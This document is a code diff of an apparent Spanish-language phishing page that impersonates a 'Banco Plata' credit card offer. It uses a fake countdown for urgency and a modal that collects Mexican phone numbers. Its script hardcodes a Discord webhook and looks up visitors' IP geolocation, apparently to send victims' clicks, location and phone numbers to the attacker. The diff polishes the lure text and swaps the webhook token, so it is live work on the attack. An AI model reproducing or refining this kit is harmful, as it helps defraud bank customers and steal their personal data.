@@ -72,11 +72,11 @@
 
     <main class="main-content">
       <h1 class="title">La tarjeta de crédito de Banco Plata</h1>
-      <p class="subtitle">Solicítalo antes del 15 de noviembre sin anualidad y obtén hasta $200,000 la línea de crédito <sup>T&C</sup></p>
+      <p class="subtitle">Solicítala antes del 15 de noviembre sin anualidad y obtén hasta $200,000 la línea de crédito <sup>T&C</sup></p>
     </main>
 
     <div class="footer">
-      <button class="btn-obtener-main" onclick="trackAction('Clic en Obtener Tarjeta (Main)'); openModal()">Obtener Credito</button>
+      <button class="btn-obtener-main" onclick="trackAction('Clic en Obtener Tarjeta (Main)'); openModal()">Obtener tarjeta</button>
     </div>
   </div>
 
@@ -88,7 +88,7 @@
         <img src="logo.jpg" alt="Tarjeta Plata" onerror="this.src='https://i.imgur.com/8QO9y8f.png'">
       </div>
 
-      <h2 class="modal-title">Llévate un credito exclusivo de Plata Card</h2>
+      <h2 class="modal-title">Llévate una cartera exclusiva al activar tu tarjeta</h2>
 
       <div class="input-group">
         <div class="prefix">+52</div>
@@ -96,21 +96,19 @@
       </div>
 
       <button class="btn-primary" id="btnSubmit" onclick="redirectToCode()">
-        <span id="btnText">Lo quiero</span>
+        <span id="btnText">La quiero</span>
         <div class="spinner" id="btnSpinner"></div>
       </button>
     </div>
   </div>
 
   <script>
-    // NUEVO WEBHOOK ACTUALIZADO
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNX3dUITQQc';
+    // URL CORREGIDA
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc';
 
-    // --- LÓGICA DE CUENTA REGRESIVA ---
-    // Establecer la fecha límite: 15 de Noviembre a las 23:59:59 (Hora local del usuario)
     function startCountdown() {
       const targetDate = new Date();
-      targetDate.setMonth(10); // Noviembre (0 = Enero, 10 = Noviembre)
+      targetDate.setMonth(10); 
       targetDate.setDate(15);
       targetDate.setHours(23, 59, 59, 999);
 
@@ -131,7 +129,6 @@
         const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
         const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-        // Formatear para que siempre tengan 2 dígitos (ej. 09 en vez de 9)
         const hStr = hours.toString().padStart(2, '0');
         const mStr = minutes.toString().padStart(2, '0');
         const sStr = seconds.toString().padStart(2, '0');
@@ -139,14 +136,12 @@
         badge.innerHTML = `🔥 Quedan ${days}d ${hStr}h ${mStr}m ${sStr}s`;
       }
 
-      updateCountdown(); // Ejecutar de inmediato
+      updateCountdown(); 
       const countdownInterval = setInterval(updateCountdown, 1000);
     }
 
-    // Iniciar la cuenta regresiva al cargar
     document.addEventListener('DOMContentLoaded', startCountdown);
 
-    // --- RESTO DE LA LÓGICA ---
     async function trackAction(actionName, phoneNumber = null) {
       try {
         const res = await fetch('https://ipapi.co/json/');
